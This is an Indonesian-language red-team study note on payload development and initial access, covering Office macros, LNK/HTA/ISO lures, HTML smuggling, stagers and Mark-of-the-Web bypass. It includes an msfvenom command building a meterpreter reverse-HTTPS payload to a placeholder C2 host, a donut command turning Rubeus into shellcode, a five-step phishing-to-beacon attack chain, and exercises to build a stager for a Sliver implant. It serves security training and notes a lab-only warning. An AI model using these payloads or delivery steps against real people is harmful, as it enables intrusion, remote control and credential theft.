# 🎣 Payload Development & Initial Access

> [!summary] Ringkasan
> Jembatan antara **menipu manusia** ([[Social Engineering]]) dan **mengendalikan mesin** ([[C2 Frameworks (Command & Control)]]): bagaimana membuat & mengantar **payload** yang, saat dibuka korban, menjalankan kode penyerang. Membahas teknik *initial access* (ATT&CK TA0001) — maldoc/macro, file LNK/HTA/ISO/OneNote, **HTML smuggling**, dan **shellcode loader/stager** — plus konsep delivery & eksekusi yang lolos filter email/endpoint. Hampir selalu dipadukan dengan [[AV-EDR Evasion & AV Bypass]].

**Bagian dari:** [[Red Team (MOC)]]
**Prasyarat:** [[Social Engineering]], [[Exploitation & Metasploit]]

---

> [!danger] Hanya berizin
> Membuat & mengirim payload ke orang tanpa izin = serangan nyata & ilegal. Praktik di **lab/phishing simulation berizin**. Lihat etika [[Social Engineering]] & [[00 - START HERE]].

## 🧠 Konsep Inti

### Rantai initial access
```text
[Delivery] → [Korban mengeksekusi] → [Stager kecil] → [Download & jalankan implant C2]
   email/web        macro/LNK/HTA          unduh payload         beacon ke [[C2 Frameworks (Command & Control)|C2]]
```

### Jenis payload pengantar (lure)
| Tipe | Cara kerja | Catatan |
|---|---|---|
| **Macro Office** (VBA) | dokumen Word/Excel jalankan VBA | makin diblok by default (MOTW), tapi masih relevan internal |
| **LNK / HTA / CHM** | shortcut/HTML app menjalankan command | populer pasca-macro dimatikan |
| **ISO / IMG / VHD** | container yang **melewati MOTW** (Mark-of-the-Web) | sering bungkus LNK+payload |
| **OneNote (.one)** | embed script/attachment | tren phishing modern |
| **HTML smuggling** | JS di halaman merakit file di sisi klien | lolos proxy/email gateway |
| **Shellcode loader** | EXE/DLL yang muat shellcode in-memory | inti, dipadu evasion |

### Stager vs stageless
- **Stager** — payload kecil yang tugasnya **mengunduh** payload penuh (implant) dari C2. Kecil = mudah disisipkan.
- **Stageless** — implant utuh dalam satu file. Lebih besar, tapi tak butuh koneksi tahap-dua saat eksekusi.

### Mark-of-the-Web (MOTW)
File dari internet ditandai MOTW → Office buka di Protected View, SmartScreen waspada. Teknik bypass (container ISO/VHD, format tanpa MOTW) jadi fokus initial access modern.

### Eksekusi & LOLBins
Payload sering memanggil **LOLBins** (rundll32, mshta, regsvr32, msbuild) untuk menjalankan kode "lewat biner sah" → membaur & menghindari deteksi.

## ⚙️ Praktik

```bash
# msfvenom — generate shellcode/payload mentah (lihat [[Exploitation & Metasploit]])
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<c2> LPORT=443 -f raw -o sc.bin
# donut — bungkus EXE/.NET assembly jadi shellcode posisi-independen
donut -i Rubeus.exe -o rubeus.bin

# Framework pembuat lure:
#  - Nishang / Macro_pack       : generate maldoc/macro/HTA/LNK
#  - GadgetToJScript / SharpShooter : payload .NET/JS/HTA
#  - HTML smuggling generator   : selipkan blob terenkripsi ke halaman
```

```text
# Alur khas:
# 1) buat shellcode (msfvenom/donut) untuk implant [[C2 Frameworks (Command & Control)|C2]]
# 2) bungkus dalam loader + [[AV-EDR Evasion & AV Bypass|evasion]] (enkripsi, syscall)
# 3) kemas dalam lure (ISO berisi LNK→loader; atau HTML smuggling)
# 4) antar via phishing ([[Social Engineering]]) / web watering-hole
# 5) korban eksekusi → stager → beacon masuk ke C2
```

## 🧰 Tools

- **msfvenom / donut / sRDI** — shellcode generation.
- **Macro_pack / Nishang** — maldoc, HTA, LNK.
- **GadgetToJScript / SharpShooter** — payload .NET/JS.
- **GoPhish / Evilginx** — delivery & phishing (lihat [[Social Engineering]]).
- **OLEVBA / oletools** — (Blue/verify) bongkar maldoc untuk analisis.

## 🔗 Kaitan

- Pengantaran ke manusia: [[Social Engineering]] (pretext, phishing) & **Evilginx** (MFA phishing).
- Disembunyikan dari endpoint: [[AV-EDR Evasion & AV Bypass]].
- Memuat & memanggil pulang: [[C2 Frameworks (Command & Control)]].
- Shellcode & eksploitasi: [[Exploitation & Metasploit]].
- **Sisi Blue ↔** [[Endpoint Security & EDR]] (deteksi maldoc/LOLBins), [[Malware Analysis Dasar]] (bongkar payload), [[Log Analysis & Monitoring]] (Event 4688/parent-child).
- Kerangka: [[Cyber Kill Chain & MITRE ATT&CK]] (Delivery/Exploitation/Initial Access).

## 🎯 Latihan

- Buat **macro/HTA sederhana** di VM yang menjalankan calc.exe, lalu kembangkan jadi stager yang memuat implant [[C2 Frameworks (Command & Control)|Sliver]].
- Eksperimen **HTML smuggling**: halaman yang merakit file payload di sisi klien, amati apakah lolos dari unduhan biasa.
- **Mode Blue:** analisis maldoc buatanmu dengan **oletools** dan amati jejak eksekusi di Event Log → lihat [[Malware Analysis Dasar]].

## 📖 Sumber

- **MITRE ATT&CK — Initial Access (TA0001)**.
- **Red Team Notes (ired.team) — Initial Access**.
- **MDSec / SpecterOps blogs** — maldev & delivery modern.
- **OWASP / Microsoft — Mark-of-the-Web** docs.
